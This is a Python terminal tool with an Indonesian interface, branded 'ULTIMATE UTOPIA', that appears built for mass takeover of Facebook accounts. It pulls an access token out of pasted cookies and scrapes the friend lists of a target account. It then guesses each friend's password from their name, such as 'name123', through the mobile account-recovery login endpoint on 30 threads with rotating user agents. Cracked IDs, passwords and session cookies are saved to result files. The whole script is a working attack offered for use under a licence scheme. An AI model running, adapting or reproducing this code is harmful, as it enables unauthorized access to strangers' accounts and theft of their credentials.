import sys
sys.path.append(sys.path[-1].replace("11","10"))
fprint = eval("__import__('rich').print")
from rich.live import Live
from rich.panel import Panel
from rich.align import Align
from rich.table import Table
from rich.box import ROUNDED
from rich.tree import Tree
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as thread
import os, urllib, http.cookiejar, json, re, random, time, datetime, string, gzip

day_list = ['Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu', 'Minggu']
month_list = ['', 'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
now_is = '{}, {} {} {}'.format(day_list[datetime.datetime.now().weekday()], datetime.datetime.now().day, month_list[datetime.datetime.now().month], datetime.datetime.now().year)

class Banner:
	def __init__(self):
		os.system('clear')
		self.__inf = '[bold cyan]Author[/bold cyan][white]: [italic white]Sptty Chan[/italic white]'

	def __repr__(self):
		return f"[deep_pink3] █    ██ ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄\n ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄\n▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄\n▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██\n▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒\n░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░\n░░▒░ ░ ░     ░      ░ ▒ ▒░ ░▒[cyan]╦[deep_pink3]░[cyan]╦╦ ╔╦╗╦╔╦╗╔═╗╔╦╗╔═╗\n[deep_pink3] ░░░ ░ ░   ░      ░ ░ ░ ▒  ░░[cyan]║ ║║  ║ ║║║║╠═╣ ║[deep_pink3]▒[cyan]║╣\n[deep_pink3]   ░                  ░ ░    [cyan]╚═╝╩═╝╩ ╩╩ ╩╩ ╩ ╩[deep_pink3]░[cyan]╚═╝[/cyan]\n{self.__inf}"

class Main:
	def __init__(self, tokenz, cookiesz, duration):
		self.__token = tokenz
		self.__cookies = cookiesz
		self.__duration = duration
		self.__name = None
		self.__useragent = True
		self.__language = ['id_ID', 'en_GB', 'jv_ID', 'ms_MY', 'ja_JP', 'ar_AR', 'fr_FR', 'es_LA', 'ko_KR', 'pt_BR', 'so_SO', 'af_ZA', 'az_AZ', 'cx_PH', 'bs_BA', 'br_FR', 'ca_ES', 'co_FR', 'cy_GB', 'da_DK', 'de_DE', 'et_EE', 'en_US', 'es_ES', 'eo_EO', 'eu_ES', 'tl_PH', 'fr_CA', 'fy_NL', 'ff_NG', 'fo_FO', 'ga_IE', 'gl_ES', 'gn_PY', 'ha_NG', 'hr_HR', 'rw_RW', 'it_IT', 'ik_US', 'sw_KE', 'ht_HT', 'ku_TR', 'lv_LV', 'lt_LT', 'hu_HU', 'mg_MG', 'mt_MT', 'nl_NL', 'nb_NO', 'nn_NO', 'uz_UZ', 'pl_PL', 'pt_PT', 'ro_RO', 'sc_IT', 'sn_ZW', 'sq_AL', 'sk_SK', 'sl_SI', 'fi_FI', 'sv_SE', 'vi_VN', 'tr_TR', 'nl_BE', 'zz_TR', 'is_IS', 'cs_CZ', 'sz_PL', 'el_GR', 'be_BY', 'bg_BG', 'mk_MK', 'mn_MN', 'ru_RU', 'sr_RS', 'tt_RU', 'tg_TJ', 'uk_UA', 'ky_KG', 'kk_KZ', 'hy_AM', 'he_IL', 'ur_PK', 'fa_IR', 'ps_AF', 'cb_IQ', 'sy_SY', 'ne_NP', 'mr_IN', 'hi_IN', 'as_IN', 'bn_IN', 'pa_IN', 'gu_IN', 'or_IN', 'ta_IN', 'te_IN', 'kn_IN', 'ml_IN', 'si_LK', 'th_TH', 'lo_LA', 'my_MM', 'ka_GE', 'am_ET', 'km_KH', 'tz_MA', 'zh_TW', 'zh_CN', 'zh_HK', 'ja_KS']
		self.__global_ua = 'Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'
		self.__blank = ' '*200
		self.__manual = False
		self.__progress = None
		self.__description = None
		self.__ismethod = True
		self.__chars = string.ascii_uppercase + string.digits + string.ascii_lowercase
		self.__id = []
		self.__ok = 0
		self.__cp = 0
		self.__loop = 0
		self.__res = '{}-{}-{}-{}'.format(day_list[datetime.datetime.now().weekday()], datetime.datetime.now().day, month_list[datetime.datetime.now().month], datetime.datetime.now().year)

	def page_display(self):
		fprint(Panel(f'Id [medium_spring_green]{self.__name[0]}[/medium_spring_green]\nName [medium_spring_green]{self.__name[1]}[/medium_spring_green]\n[light_sky_blue1]Sisa durasi lisensi[/light_sky_blue1] [medium_spring_green]{self.__duration}[/medium_spring_green]', title='[light_sky_blue1]Informasi User[/light_sky_blue1]', box=ROUNDED))
		table = Table(box=ROUNDED)
		table.add_column('No   ', justify='center')
		table.add_column(f'Menu{self.__blank}', justify='center')
		table.add_row('[light_sky_blue1]01[/light_sky_blue1]', 'Crack dari pertemanan publik')
		table.add_row('[light_sky_blue1]02[/light_sky_blue1]', 'Cek result crack [medium_spring_green](OK/CP)[/medium_spring_green]')
		table.add_row('[light_sky_blue1]03[/light_sky_blue1]', 'Setting atau ganti user agent manual')
		table.add_row('[bright_red]00[/bright_red]', 'Logout [medium_spring_green](keluar)[/medium_spring_green]')
		fprint(table)
		inpt, inpt_ = ['01','02','03','04','00','1','2','3','4','0'], False
		while inpt_ not in inpt:
			if inpt_ or inpt_ == '':
				fprint(f'!!. "{inpt_}" tidak tersedia pada pilihan')
			inpt_ = Console().input('??. Pilih: ')
		if inpt_ in ['01','1']:
			self.dump_id()
			self.whatisuseragent()
			self.midpool()
		elif inpt_ in ['02','2']:
			self.cek_results()
		elif inpt_ in ['03','3']:
			self.setting_user_agent()
			os.system('clear')
			fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
			self.page_display()
		elif inpt_ in ['00','0']:
			os.system('rm -rf data/token.txt data/cookies.txt')
			fprint('✓✓. Anda berhasil logout, Terimakasih.')
			exit()

	def cek_results(self):
		fprint(Panel(Align.center('Pilih Untuk Ditampilkan'), box=ROUNDED))
		if len(os.listdir('result')) == 0:
			fprint('**. Anda belum memiliki result, tekan enter untuk kembali')
			input('[ Enter ]')
			os.system('clear')
			fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
			self.page_display()
		else:
			myresult = []
			for i in os.listdir('result'):
				filename = re.search('^((OK|CP)\-.*?\-\d+\-.*?\-\d+\.txt)$', i)
				if filename is not None:
					myresult.append(filename.group(1))
			if len(myresult) == 0:
				fprint('**. Anda belum memiliku result, tekan enter untuk kembali')
				input('[ Enter ]')
				os.system('clear')
				fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
				self.page_display()
			else:
				for i in enumerate(myresult):
					count = len([a.replace('\n','') for a in open(f'result/{i[1]}', 'r').readlines() if a.replace('\n','').replace(' ','') != ''])
					if 'OK' in i[1]:
						fprint(f'[light_green]{i[0]+1}. {i[1]} => {count} Akun[/light_green]')
					else:
						fprint(f'[yellow]{i[0]+1}. {i[1]} => {count} Akun[/yellow]')
				while True:
					inpt = Console().input('??. Pilih: ')
					if not str(inpt).isdigit():
						fprint(f'!!. "{inpt}" tidak tersedia pada pilihan')
					else:
						if int(inpt) not in list(range(1, len(myresult) + 1)):
							fprint(f'!!. "{inpt}" tidak tersedia pada pilihan')
						else:
							break
				datlist = [a.replace('\n','') for a in open(f'result/{myresult[int(inpt)-1]}', 'r').readlines() if a.replace('\n','').replace(' ','') != '']
				teks = f'Menampilkan result [bold light_green]{myresult[int(inpt)-1]}[/bold light_green] ==> {len(datlist)} Akun' if 'OK' in myresult[int(inpt)-1] else f'Menampilkan result [bold yellow]{myresult[int(inpt)-1]}[/bold yellow] ==> {len(datlist)} Akun'
				fprint(Panel(teks, box=ROUNDED, title='[white]RESULT[/white]'))
				if len(datlist) == 0:
					fprint('!!. Tidak ada result untuk ditampilkan')
				else:
					for i in datlist:
						teks = f'[light_green]{i}[/light_green]' if 'OK' in myresult[int(inpt)-1] else f'[yellow]{i}[/yellow]'
						tr = Tree('')
						tr.add(teks)
						fprint(tr)
				input('[ Tekan enter untuk kembali ]')
				os.system('clear')
				fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
				self.page_display()

	def cek_sesi_login(self):
		try:
			cj = http.cookiejar.CookieJar()
			opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
			opener.addheaders = [
				('Cookie', self.__cookies),
				('user-agent', self.__global_ua),
			]
			urllib.request.install_opener(opener)
			name = urllib.request.Request(f'https://graph.facebook.com/me?access_token={self.__token}')
			name = json.loads(urllib.request.urlopen(name).read().decode())
			self.__name = (name['id'], name['name'])
			return True
		except urllib.error.HTTPError:
			fprint('!!. Sesi login invalid, silahkan login terlebih dahulu')
			os.system('rm -rf data/token.txt')
			return False
		except urllib.error.URLError:
			fprint('!!. Periksa koneksi internet anda')
			return False

	def dump_id(self):
		fprint(Panel('Pastikan pertemanan dari id yang ada masukkan bersifat [medium_spring_green]publik[/medium_spring_green]. Masukkan [italic light_sky_blue1]me[/italic light_sky_blue1] untuk crack dari pertemanan sendiri.', box=ROUNDED, title='[white]Perhatian[/white]'))
		while True:
			inpt = Console().input('??. Masukkan id: ')
			if inpt.replace(' ','') == '':
				fprint('!!. Tidak boleh kosong!')
			else:
				break
		try:
			cj = http.cookiejar.CookieJar()
			opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
			opener.addheaders = [
				('Cookie', self.__cookies),
				('user-agent', self.__global_ua),
			]
			tname = urllib.request.Request(f'https://graph.facebook.com/v18.0/{inpt}?access_token={self.__token}')
			tname = json.loads(urllib.request.urlopen(tname).read().decode())
			url = f'https://b-graph.facebook.com/v18.0/{inpt}/friends?fields=friends&access_token={self.__token}'
			desc = f">>. Mengambil: {len(self.__id)}"
			progress = Progress(TextColumn("{task.description}"))
			tazk = progress.add_task("")
			with progress:
				while True:
					try:
						loader = urllib.request.Request(url)
						loader = json.loads(urllib.request.urlopen(loader).read().decode())
						if 'summary' not in loader:
							fprint('!!. Pertemanan private/Cookies invalid')
							break
						else:
							for item in loader["data"]:
								try:
									for idname in item['friends']['data']:
										try:
											id, name = idname['id'], idname['name'].lower()
											if f'{id}|{name}' not in self.__id:
												self.__id.append(f'{id}|{name}')
										except:
											pass
								except:
									pass
							progress.update(tazk, description=f">>. Mengambil: {len(self.__id)}")
							progress.advance(tazk)
						url = loader['paging']['next'].replace('limit=25&','')
					except KeyboardInterrupt:
						break
					except urllib.error.URLError:
						break
					except:
						break
			fprint(f'##. Nama       : {tname["name"]}')
			fprint(f'##. Pertemanan : {len(self.__id)}')
		except urllib.error.HTTPError:
			fprint('!!. Id tidak ditemukan')
			exit()
		except urllib.error.URLError:
			fprint('!!. Periksa koneksi internet anda')
			exit()
		table = Table(box=ROUNDED)
		table.add_column('No   ', justify='center')
		table.add_column(f'Menu{self.__blank}', justify='center')
		table.add_row('[light_sky_blue1]01[/light_sky_blue1]', 'Setting id, New lebih dahulu')
		table.add_row('[light_sky_blue1]02[/light_sky_blue1]', 'Setting id, Old lebih dahulu')
		table.add_row('[light_sky_blue1]03[/light_sky_blue1]', 'Ter-acak [ [light_green]Recommended[/light_green] ]')
		fprint(table)
		inpt, inpt_ = ['01','02','03','1','2','3'], False
		while inpt_ not in inpt:
			if inpt_ or inpt_ == '':
				fprint(f'!!. "{inpt_}" tidak tersedia pada pilihan')
			inpt_ = Console().input('??. Pilih: ')
		if inpt_ in ['01','1']:
			temp_list = []
			for i in self.__id:
				temp_list.insert(0, i)
			self.__id = temp_list
		elif inpt_ in ['02','2']:
			pass
		elif inpt_ in ['03','3']:
			random.shuffle(self.__id)
		data = {}
		for i in self.__id:
			idku = re.search('(\d+)\|', i).group(1)
			nameku = i.replace(f'{idku}|', '')
			data[idku] = nameku
		open('/sdcard/script/data.json', 'w').write(str(data))

	def midpool(self):
		self.__progress = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(), TextColumn('{task.percentage:.0f}%'), TextColumn('['), SpinnerColumn('aesthetic'), TextColumn(']'))
		self.__description = self.__progress.add_task('[bright_green]ULTIMATE UTOPIA[/bright_green]',total=len(self.__id))
		fprint(Panel(f'Crack sedang berlangsung. Mode pesawat setiap [medium_spring_green]200[/medium_spring_green] id. Tekan [italic light_sky_blue1]CTRL + Z[/italic light_sky_blue1] jika ingin berhenti.\n\nResult hari ini [bold cyan]{now_is}[/bold cyan] disimpan ke:\n* Success [light_green]result/OK-{self.__res}.txt[/light_green]\n* Checkpoint [yellow]result/CP-{self.__res}.txt[/yellow]', box=ROUNDED, title='[white]ULTIMATE UTOPIA[/white]'))
		with self.__progress:
			with thread(max_workers=30) as sender:
				for item in self.__id:
					data = []
					idd, name = item.split('|')
					fname = name.split(' ')[0]
					if len(name) >= 6:
						data.append(name)
					if len(name.replace(' ','')) >= 6:
						data.append(name.replace(' ',''))
					if len(fname) >= 3:
						data.append(f'{fname}123')
						data.append(f'{fname}12345')
					sender.submit(self.crack, idd, data)

	def setting_user_agent(self):
		fprint(Panel('Hati hati dalam memilih user agent. Beberapa user agent [medium_spring_green]tidak cocok[/medium_spring_green] dengan headers kami sehingga menyebabkan method [light_sky_blue1]tidak bekerja[/light_sky_blue1] dengan semestinya.', box=ROUNDED, title='[white]Informasi[/white]'))
		while True:
			inpt = Console().input('??. Masukkan user agent: ')
			if inpt.replace(' ','') == '':
				fprint('!!. Jangan kosong, isi dengan user agent')
			else:
				open('data/ua.txt','w').write(str(inpt))
				fprint('✓✓. User agent berhasil disimpan, tekan enter untuk melanjutkan')
				input('[ Enter ]')
				break

	def whatisuseragent(self):
		table = Table(box=ROUNDED)
		table.add_column('No   ', justify='center')
		table.add_column(f'Menu{self.__blank}', justify='center')
		table.add_row('[light_sky_blue1]01[/light_sky_blue1]', 'Gunakan user agent default [light_sky_blue1](Random)[/light_sky_blue1] [ [light_green]Recommended[/light_green] ]')
		table.add_row('[light_sky_blue1]02[/light_sky_blue1]', 'Gunakan user agent manual')
		fprint(table)
		inpts, inpts_ = ['01', '02', '1', '2'], False
		while inpts_ not in inpts:
			if inpts_ or inpts_ == '':
				fprint(f'!!. "{inpts_}" tidak tersedia pada pilihan')
			inpts_ = Console().input('??. Pilih: ')
		if inpts_ in ['02', '2']:
			ua = 'ua.txt' in os.listdir('data')
			self.__useragent = False
			if not ua:
				fprint(Panel('Maaf, anda belum men-setting user agent manual. Silahkan setting terlebih dahulu.', box=ROUNDED, title='[white]Perhatian[/white]'))
				self.setting_user_agent()
			self.__manual = open('data/ua.txt','r').read()

	def crack(self, idd, data):
		self.__progress.update(self.__description, description=f'[ [light_green]Cracking[/light_green] ] {self.__loop}/{len(self.__id)} OK:-{self.__ok} CP:-{self.__cp}')
		try:
			user_agent = self.r_agent()
			abstract_pw = ''.join(string.ascii_lowercase[random.randint(0, len(string.ascii_lowercase)-1)] for num in range(8))
			cj = http.cookiejar.CookieJar()
			opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
			opener.addheaders = [
				('Host', 'm.facebook.com'),
				('upgrade-insecure-requests', '1'),
				('user-agent', user_agent),
				('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
				('dnt', '1'),
				('x-requested-with', 'com.transsion.phoenix'),
				('sec-fetch-site', 'none'),
				('sec-fetch-mode', 'navigate'),
				('sec-fetch-user', '?1'),
				('sec-fetch-dest', 'document'),
				('accept-encoding', 'gzip, deflate, utf-8'),
				('accept-language', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'),
			]
			urllib.request.install_opener(opener)
			req = urllib.request.Request(f'https://m.facebook.com/login/device-based/password/?uid={idd}&flow=login_no_pin&refsrc=deprecated&_rdr', method='GET')
			resp = urllib.request.urlopen(req).read()
			resps = gzip.decompress(resp).decode('utf-8')
			data_cookies_ = {cukis.name: cukis.value for cukis in list(cj)}
			if len(data_cookies_) == 0:
				urllib.request.install_opener(opener)
				req = urllib.request.Request(f'https://m.facebook.com/login/device-based/password/?uid={idd}&flow=login_no_pin&refsrc=deprecated&_rdr', method='GET')
				resp = urllib.request.urlopen(req).read()
				resps = gzip.decompress(resp).decode('utf-8')
				data_cookies_ = {cukis.name: cukis.value for cukis in list(cj)}
			set_cookies_ = f'datr={data_cookies_["datr"]}; sb={data_cookies_["sb"]}; locale=id_ID; vpd=v1;680x360x2; dpr=2; m_pixel_ratio=2; wd=360x680; fr={data_cookies_["fr"]}'
			payload = {
				'lsd': re.search('name="lsd" value="(.*?)"', resps).group(1),
				'jazoest': re.search('name="jazoest" value="(.*?)"', resps).group(1),
				'uid': idd,
				'next': 'https://m.facebook.com/login/save-device/',
				'flow': 'login_no_pin',
				'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{abstract_pw}',
			}
			payload_ = urllib.parse.urlencode(payload).encode('ascii')
			opener.addheaders = [
				('Host', 'm.facebook.com'),
				('cache-control', 'max-age=0'),
				('upgrade-insecure-requests', '1'),
				('origin', 'https://m.facebook.com'),
				('content-type', 'application/x-www-form-urlencoded'),
				('user-agent', user_agent),
				('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
				('x-requested-with', 'com.transsion.phoenix'),
				('sec-fetch-site', 'same-origin'),
				('sec-fetch-mode', 'navigate'),
				('sec-fetch-user', '?1'),
				('sec-fetch-dest', 'document'),
				('referer', f'https://m.facebook.com/login/device-based/password/?uid={idd}&flow=login_no_pin&refsrc=deprecated&_rdr'),
				('accept-encoding', 'gzip, deflate, utf-8'),
				('accept-language', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'),
				('cookie', set_cookies_),
			]
			urllib.request.install_opener(opener)
			reqq = urllib.request.Request('https://m.facebook.com/login/device-based/validate-password/?shbl=0', payload_)
			respp = urllib.request.urlopen(reqq).read()
			respps = gzip.decompress(respp).decode('utf-8')
			title = re.search('<title>(.*?)</title>', respps).group(1)
			if title == 'Lupa Kata Sandi | Tidak Dapat Masuk | Facebook':
				cokis = {cukis.name: cukis.value for cukis in list(cj)}
				cuid = cokis['sfiu'] if 'sfiu' in cokis else cokis['sfau']
				ckey = 'sfiu' if 'sfiu' in cokis else 'sfau'
				flow = random.choice([('ncpfar', 'no_cp_for_ar'), ('initiate_view', 'initiate_view'), ('al_pw_conf', 'assistive_login'), ('recovery', 'recovery')])
				user_agent_ = self.r_agent(mainuser=True) if self.__useragent else self.__manual
				locale = random.choice(self.__language)
				encd = random.choice(['br', 'utf-8'])
				_payload = {
					'lsd': payload['lsd'],
					'jazoest': payload['jazoest'],
					'cuid': cuid,
					'flow': flow[0],
					'pass': '',
				}
				for password in data:
					_payload['pass'] = password
					_payload_ = urllib.parse.urlencode(_payload).encode('ascii')
					data_cookies = {cukis.name: cukis.value for cukis in list(cj)}
					set_cookies = f'datr={data_cookies["datr"]}; sb={data_cookies["sb"]}; locale={locale}; vpd=v1;680x360x2; dpr=2; m_pixel_ratio=2; wd=360x680; fr={data_cookies["fr"]}; {ckey}={cuid}'
					opener.addheaders = [
						('Host', 'm.facebook.com'),
						('cache-control', 'max-age=0'),
						('upgrade-insecure-requests', '1'),
						('origin', 'https://m.facebook.com'),
						('content-type', 'application/x-www-form-urlencoded'),
						('user-agent', user_agent_),
						('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
						('x-requested-with', 'com.transsion.phoenix'),
						('sec-fetch-site', 'same-origin'),
						('sec-fetch-mode', 'navigate'),
						('sec-fetch-user', '?1'),
						('sec-fetch-dest', 'document'),
						('referer', f'https://m.facebook.com/login/account_recovery/name_search/?cuid={cuid}&flow={flow[0]}&ls={flow[1]}&refsrc=deprecated&_rdr'),
						('accept-encoding', f'gzip, deflate, {encd}'),
						('accept-language', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'),
						('cookie', set_cookies),
					]
					urllib.request.install_opener(opener)
					reqq_ = urllib.request.Request(f'https://m.facebook.com/login/account_recovery/name_search/?flow={flow[0]}&ls={flow[1]}&c=%2Flogin%2F', _payload_)
					respp_ = urllib.request.urlopen(reqq_)
					if 'c_user' in str(cj):
						self.__ok += 1
						cookie = {a.name: a.value for a in list(cj)}
						cookiez = f'datr={cookie["datr"]};sb={cookie["sb"]};vpd=v1%3B680x360x2;dpr=2;m_pixel_ratio=2;locale=id_ID;wd=360x680;fr={cookie["fr"]};c_user={cookie["c_user"]};xs={cookie["xs"]}'
						tr = Tree('')
						tr.add(f'[light_green]{idd}|{password}|{cookiez}|{flow[0]}|{locale}[/light_green]')
						fprint(tr)
						open(f'result/OK-{self.__res}.txt','a').write(f'{idd}|{password}|{cookiez}\n')
						break
					elif 'checkpoint' in str(cj):
						self.__cp += 1
						tr = Tree('')
						tr.add(f'[yellow]{idd}|{password}|{flow[0]}|{locale}[/yellow]')
						fprint(tr)
						open(f'result/CP-{self.__res}.txt','a').write(f'{idd}|{password}\n')
						break
					else:
						continue
		except urllib.error.URLError:
			time.sleep(30)
		self.__loop += 1
		self.__progress.advance(self.__description)

	def r_agent(self, mainuser=False):
		chrome = random.randint(54,107)
		chrome_ = random.randint(2171,5304)
		chrome__ = random.randint(20,154)
		useragent = f'Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
#		useragent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
		useragent_ = f'Mozilla/5.0 (Linux; Android 7.1.1; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome}.0.{chrome_}.{chrome__} Mobile Safari/537.36 EdgA/83.0.478.37'
		return useragent if mainuser else useragent_

def duration(code):
	day = 86400
	hour = int(day/24)
	minute = int(hour/60)
	second = int(minute/60)
	timer = re.findall('\d+', code)
	abs_num = int(time.time()) - int(timer[0])
	total_second = int(timer[1]) - abs_num
	if total_second >= day:
		sisa_waktu = f'{int(total_second/day)} Hari'
	elif total_second >= hour and total_second < day:
		sisa_waktu = f'{int(total_second/hour)} Jam'
	elif total_second >= minute and total_second < hour:
		sisa_waktu = f'{int(total_second/minute)} Menit'
	elif total_second >= second and total_second < minute:
		sisa_waktu = f'{int(total_second/second)} Detik'
	else:
		sisa_waktu = False
	return sisa_waktu

def key_validator(key):
	if len(key) < 99:
		return False
	else:
		try:
			token = key[0: len(key)-99]
			secret_key = key[len(key)-99:]
			data = {}
			for i in range(11):
				i = i*9
				datatemp = secret_key[i:(i+9)]
				if i == 0:
					data[datatemp] = ' '
				else:
					reversed_num = int(i/9) - 1
					data[datatemp] = str(reversed_num)
			def reverser(x):
				return data[x]
			new_data = []
			for i in range(int(len(token)/9)):
				i = i*9
				abstrac_dat = token[i:(i+9)]
				new_data.append(abstrac_dat)
			reversing = map(reverser, new_data)
			reversing = [int(a) for a in  ''.join(a for a in list(reversing)).split(' ')]
			reversing = map(chr, reversing)
			reversed = ''.join(a for a in list(reversing))
			test = re.search('^ztime.*?\ninteger_x.*?\d+$', reversed)
			if test is not None:
				return reversed
			else:
				return False
		except Exception as e:
			return False

def key_extractor(key=False):
	if not key:
		fprint(Panel(Align.center('Lisensi turun tiap hari, silahkan cek beranda facebook admin. [medium_spring_green]#Gratis[/medium_spring_green]'), box=ROUNDED))
		while True:
			inpt = Console().input('??. Masukkan lisensi: ')
			if inpt.replace(' ','') == '':
				fprint('!!. Jangan kosong, isi dengan lisensi yang diberikan admin')
			else:
				tester = key_validator(inpt)
				if tester:
					check_duration = duration(tester)
					if check_duration:
						open('data/lisensi.txt','w').write(inpt)
						fprint(Panel(Align.center(f'Lisensi ini berlaku selama [medium_spring_green]{check_duration}[/medium_spring_green] dari sekarang'), box=ROUNDED, title='[white]Informasi Lisensi[/white]'))
						fprint('✓✓. Validasi lisensi berhasil, silahkan jalankan ( ./run )')
						break
					else:
						fprint('!!. Gagal, lisensi ini sudah kadaluarsa')
				else:
					fprint('!!. Gagal, lisensi invalid')
	else:
		tester = key_validator(key)
		if tester:
			check_duration = duration(tester)
			if check_duration:
				return check_duration
			else:
				fprint('!!. Lisensi ini sudah kadaluarsa')
		else:
			fprint('!!. Lisensi invalid')

def login():
	information = Panel(Align.center('Jangan mematikan koneksi internet saat login. Pastikan cookies yang anda masukkan valid. Jika login gagal, cobalah menggunakan [light_sky_blue1]cookies[/light_sky_blue1] yang lain.'), box=ROUNDED, title='[white]Perhatian[/white]')
	fprint(information)
	while True:
		inpt = Console().input('??. Masukkan cookies: ')
		if inpt.replace(' ','') == '':
			fprint('!!. Jangan kosong, isi dengan cookies facebook')
		else:
			try:
				cj = http.cookiejar.CookieJar()
				opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
				urllib.request.install_opener(opener)
				opener.addheaders = [
					('Host', 'adsmanager.facebook.com'),
					('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
					('accept-encoding', 'deflate'),
					('cookie', inpt),
					('referer', 'https://adsmanager.facebook.com/adsmanager/manage/campaigns'),
					('sec-ch-prefers-color-schema', 'light'),
					('sec-ch-ua', '" Not A;Brand";v="99", "Chromium";v="101"'),
					('sec-ch-ua-mobile', '?1'),
					('sec-ch-ua-platform', '"Android"'),
					('sec-fetch-dest', 'document'),
					('sec-fetch-mode', 'navigate'),
					('sec-fetch-site', 'same-origin'),
					('upgrade-insecure-requests', '1'),
					('user-agent', 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'),
				]
				urllib.request.install_opener(opener)
				response = urllib.request.Request('https://adsmanager.facebook.com/adsmanager/manage/campaigns', method='GET')
				response = urllib.request.urlopen(response).read().decode()
				act_code = re.search('(\?act=.*?)"', response)
				if act_code is not None:
					response_ = urllib.request.Request('https://adsmanager.facebook.com/adsmanager/manage/campaigns' + act_code.group(1), method='GET')
					response_ = urllib.request.urlopen(response_).read().decode()
					token = re.search('accessToken="(.*?)"', response_)
					if token is not None:
						token = token.group(1)
						open('data/token.txt','w').write(token)
						open('data/cookies.txt','w').write(str(inpt))
						fprint('✓✓. Login berhasil, silahkan jalankan ( ./run )')
						break
					else:
						fprint('!!. Cookies invalid, periksa & coba lagi')
				else:
					fprint('!!. Cookies invalid, periksa & coba lagi')
			except urllib.error.URLError:
				fprint('!!. Periksa koneksi internet anda')
			except Exception as e:
				fprint(f'!!. Kesalahan: {e}')
				fprint('!!. anda bisa melaporkannya ke admin agar diperbaiki')
				break

def updater():
	nowis = 16
	try:
		response = urllib.request.Request('https://main--glistening-baklava-cd98ca.netlify.app/versi', method='GET')
		response = urllib.request.urlopen(response).read().decode()
		version = int(re.search('<p>(.*?)</p>', response).group(1))
		if version > nowis:
			fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
			fprint('>>. Update, tunggu sentar...')
			os.system('rm -rf run')
			os.system('git pull')
			fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
			os.system('python setup.py')
			exit()
	except urllib.error.URLError:
		fprint('!!. Periksa koneksi internet anda')
		exit()

if __name__ == '__main__':
	updater()
	if 'lisensi.txt' in os.listdir('data'):
		lisen = open('data/lisensi.txt', 'r').read()
		check = key_extractor(lisen)
		if check:
			if 'token.txt' in os.listdir('data') and 'cookies.txt' in os.listdir('data'):
				token = open('data/token.txt','r').read()
				cookies = open('data/cookies.txt','r').read()
				fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
				Start = Main(token, cookies, check)
				if Start.cek_sesi_login():
					Start.page_display()
			else:
				fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
				login()
		else:
			os.system('rm -rf data/lisensi.txt')
			fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
			fprint('!!. Lisensi kadaluarsa, silahkan minta kepada admin')
			exit()
	else:
		fprint(Panel(Align.center(str(Banner())), title='[light_green]ULTIMATE UTOPIA[/light_green]', subtitle='[white]Versi 1.4[/white]', padding=1, box=ROUNDED))
		key_extractor()
